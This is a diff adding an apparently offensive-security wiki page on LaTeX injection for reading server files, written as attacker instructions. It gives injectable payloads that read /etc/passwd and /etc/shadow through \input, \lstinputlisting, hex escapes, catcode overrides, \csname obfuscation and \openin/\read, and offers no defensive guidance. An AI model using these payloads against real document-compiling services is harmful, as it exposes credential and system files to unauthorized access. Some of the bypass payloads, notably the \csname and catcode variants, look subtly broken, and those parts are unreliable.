@@ -1,0 +1,111 @@
+---
+title: 'LaTeX Injection: Read File Exploitation Explained'
+description: Explore LaTeX injection techniques to disclose files, bypass filters,
+  and understand risks.
+keywords:
+- LaTeX injection
+- file disclosure
+- input filter bypass
+- catcode override
+- command expansion techniques
+---
+
+# Read File
+
+## Context
+
+This guide focuses on exploiting LaTeX injection to disclose file contents on a server, leveraging various command techniques and encoding unwonted paths. By understanding how LaTeX processes file input and applying bypass techniques, attackers can read sensitive files without being detected by typical input validation measures. This article assumes you have foundational knowledge of LaTeX commands, file system structures, character encoding, and LaTeX Injection practices.
+
+## Theory
+
+### File Disclosure via LaTeX Injection
+
+LaTeX is a typesetting system that processes file inclusion commands during compilation. This capability can be abused to read and disclose arbitrary files from a server's filesystem. The vulnerability arises because LaTeX compilers execute file inclusion commands without adequate sandboxing, allowing attackers to inject these commands into user-controlled input fields. When the compiled document is rendered, contents of these files are disclosed to the attacker, facilitating unauthorized data access.
+
+### Key LaTeX File Inclusion Primitives
+
+Various LaTeX commands can be exploited to include file contents:
+
+- `\input{file}` and `\include{file}` insert file contents directly at compile time.
+- `\openin` and `\read` allow file content to be read line-by-line.
+- `\lstinputlisting` and `\verbatiminput` allow the display of file contents in their entirety and without formatting.
+
+### Bypassing Input Filters and Encoding Restrictions
+
+To successfully disclose files, attackers need to bypass input filters and any encoding restrictions that may be in place:
+
+- **Unicode and Hexadecimal Escapes**: Characters can be obfuscated using their Unicode (e.g., `^^2f` for '/') or hexadecimal equivalents to bypass naive blacklists.
+- **Catcode Overrides**: This technique involves redefining certain characters' behavior (via catcodes) to circumvent input checks.
+- **Command Expansion Primitives**: Using `\expandafter` and `\csname`, attackers can construct and obfuscate payloads dynamically, evading static analysis.
+
+## Practice
+
+### Direct File Inclusion with \input
+
+Directly inject the following LaTeX payload into the input field where the LaTeX code is parsed:
+
+```latex
+\input{/etc/passwd}
+```
+
+This command attempts to include and render the contents of the `/etc/passwd` file. If successful, the sensitive file contents will be disclosed in the compiled document.
+
+### File Disclosure with \lstinputlisting
+
+To display a file's contents verbatim in the compiled output, use the `\lstinputlisting` command:
+
+```latex
+\lstinputlisting{/etc/shadow}
+```
+
+This renders the contents of `/etc/shadow` directly, facilitating the exposure of sensitive data.
+
+### Bypassing Filters with Unicode/Hexadecimal Escapes
+
+To evade input filters that block `/` or other characters, leverage hexadecimal escapes:
+
+```latex
+\input{^^2fetc^^2fpasswd}
+```
+
+This sequence translates the hexadecimal encoding to '/' during processing, bypassing straightforward filter attempts.
+
+### Catcode Override for File Inclusion
+
+Adjust the category code of characters like `/` to enable file inclusion bypass:
+
+```latex
+\catcode`/=0 \input/etc/passwd
+```
+
+This technique redefines `/` as an escape character, bypassing character-level restrictions in the system.
+
+### Obfuscated Inclusion with \expandafter and \csname
+
+Employ these LaTeX commands to obfuscate paths and evade filtration mechanisms:
+
+```latex
+\expandafter\input\csname etc/passwd\endcsname
+```
+
+The expression obfuscates the path's appearance to circumvent simple pattern detection or static analysis tools.
+
+### Line-by-Line File Read with \openin and \read
+
+To read files line-by-line, inject the following sequence:
+
+```latex
+\newread\file
+\openin\file=/etc/passwd
+\read\file to\line
+\closein\file
+\line
+```
+
+This script opens the file, reads a single line into `\line`, and outputs it. Looping this payload could disclose the entire file.
+
+## Tools
+
+- **pdflatex**
+- **lualatex**
+- **xelatex**
